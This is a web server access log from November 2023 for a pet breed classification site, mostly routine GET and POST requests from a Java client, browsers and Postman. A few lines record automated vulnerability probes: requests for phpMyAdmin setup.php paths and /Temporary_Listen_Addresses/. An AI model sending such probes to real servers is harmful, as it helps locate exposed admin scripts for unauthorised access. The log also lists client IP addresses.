110.8.166.180 - - [15/Nov/2023:20:15:14 +0900] "GET /breed_classification?postId=3 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:20:15:22 +0900] "GET /breed_classification/?postId=3 HTTP/1.1" 200 1 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:20:15:48 +0900] "GET /breed_classification?postId=4 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:20:15:49 +0900] "GET /breed_classification/?postId=4 HTTP/1.1" 200 1 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:20:31:23 +0900] "GET /breed_classification?postId=5 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:20:31:24 +0900] "GET /breed_classification/?postId=5 HTTP/1.1" 200 1 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
39.7.46.167 - - [15/Nov/2023:20:31:42 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [15/Nov/2023:20:31:46 +0900] "GET /breed_classification?postId=6 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:20:31:47 +0900] "GET /breed_classification/?postId=6 HTTP/1.1" 200 1 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:20:31:53 +0900] "GET /breed_classification?postId=7 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:20:31:54 +0900] "GET /breed_classification/?postId=7 HTTP/1.1" 200 1 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:20:32:04 +0900] "GET /breed_classification?postId=8 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:20:32:07 +0900] "GET /breed_classification/?postId=8 HTTP/1.1" 200 1 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
59.2.23.148 - - [15/Nov/2023:20:34:39 +0900] "GET http://180.65.33.140:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 301 169 "-" "-"
59.2.23.148 - - [15/Nov/2023:20:34:39 +0900] "GET http://180.65.33.140:80/phpmyadmin/scripts/setup.php HTTP/1.0" 301 169 "-" "-"
59.2.23.148 - - [15/Nov/2023:20:34:39 +0900] "GET http://180.65.33.140:80/phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.0" 301 169 "-" "-"
59.2.23.148 - - [15/Nov/2023:20:34:39 +0900] "GET http://180.65.33.140:80/db/scripts/setup.php HTTP/1.0" 301 169 "-" "-"
165.229.125.59 - - [15/Nov/2023:20:44:02 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [15/Nov/2023:20:44:16 +0900] "GET /breed_classification?postId=9 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:20:44:18 +0900] "GET /breed_classification/?postId=9 HTTP/1.1" 200 1 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:20:44:30 +0900] "GET /breed_classification?postId=10 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:20:44:31 +0900] "GET /breed_classification/?postId=10 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
165.229.229.46 - - [15/Nov/2023:20:46:53 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
179.43.163.133 - - [15/Nov/2023:20:50:20 +0900] "GET / HTTP/1.1" 301 169 "-" "-"
192.168.45.1 - - [15/Nov/2023:20:52:35 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "-" "PostmanRuntime/7.32.3"
165.229.229.46 - - [15/Nov/2023:20:52:36 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
165.229.229.46 - - [15/Nov/2023:20:53:05 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
110.8.166.180 - - [15/Nov/2023:20:53:17 +0900] "GET /breed_classification?postId=11 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:20:53:27 +0900] "GET /breed_classification/?postId=11 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
192.168.45.1 - - [15/Nov/2023:20:55:00 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [15/Nov/2023:20:55:52 +0900] "GET /breed_classification?postId=12 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:20:55:53 +0900] "GET /breed_classification/?postId=12 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
39.7.46.167 - - [15/Nov/2023:20:57:01 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [15/Nov/2023:20:57:16 +0900] "GET /breed_classification?postId=13 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:20:57:17 +0900] "GET /breed_classification/?postId=13 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
39.7.46.167 - - [15/Nov/2023:21:00:18 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
39.7.46.167 - - [15/Nov/2023:21:00:30 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [15/Nov/2023:21:00:38 +0900] "GET /breed_classification?postId=14 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:21:00:39 +0900] "GET /breed_classification/?postId=14 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:21:13:16 +0900] "GET /breed_classification?postId=15 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:21:13:17 +0900] "GET /breed_classification/?postId=15 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
165.229.229.46 - - [15/Nov/2023:21:13:25 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
110.8.166.180 - - [15/Nov/2023:21:13:35 +0900] "GET /breed_classification?postId=16 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:21:13:46 +0900] "GET /breed_classification/?postId=16 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
192.168.45.1 - - [15/Nov/2023:21:14:27 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [15/Nov/2023:21:15:02 +0900] "GET /breed_classification?postId=17 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:21:15:04 +0900] "GET /breed_classification/?postId=17 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
192.168.45.1 - - [15/Nov/2023:21:16:02 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "-" "PostmanRuntime/7.32.3"
39.7.46.167 - - [15/Nov/2023:21:16:15 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
165.229.229.46 - - [15/Nov/2023:21:16:48 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
165.229.229.46 - - [15/Nov/2023:21:18:55 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
165.229.229.46 - - [15/Nov/2023:21:19:48 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
192.168.45.1 - - [15/Nov/2023:21:20:12 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "-" "PostmanRuntime/7.32.3"
192.168.45.1 - - [15/Nov/2023:21:20:43 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "-" "PostmanRuntime/7.32.3"
34.34.184.28 - - [15/Nov/2023:21:22:33 +0900] "GET /Temporary_Listen_Addresses/ HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
110.8.166.180 - - [15/Nov/2023:21:25:24 +0900] "GET /breed_classification?postId=18 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:21:25:26 +0900] "GET /breed_classification/?postId=18 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:21:27:51 +0900] "GET /breed_classification?postId=19 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:21:27:54 +0900] "GET /breed_classification/?postId=19 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:21:28:35 +0900] "GET /breed_classification?postId=20 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:21:28:37 +0900] "GET /breed_classification/?postId=20 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:21:29:41 +0900] "GET /breed_classification?postId=21 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:21:29:43 +0900] "GET /breed_classification/?postId=21 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
192.168.45.1 - - [15/Nov/2023:21:30:59 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
192.168.45.1 - - [15/Nov/2023:21:33:43 +0900] "POST /breed_classification/classify/ HTTP/1.1" 200 1 "https://savethepets.kro.kr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
110.8.166.180 - - [15/Nov/2023:21:34:11 +0900] "GET /breed_classification?postId=23 HTTP/1.1" 301 5 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
110.8.166.180 - - [15/Nov/2023:21:34:13 +0900] "GET /breed_classification/?postId=23 HTTP/1.1" 200 2 "-" "Apache-HttpClient/5.2.1 (Java/19.0.2)"
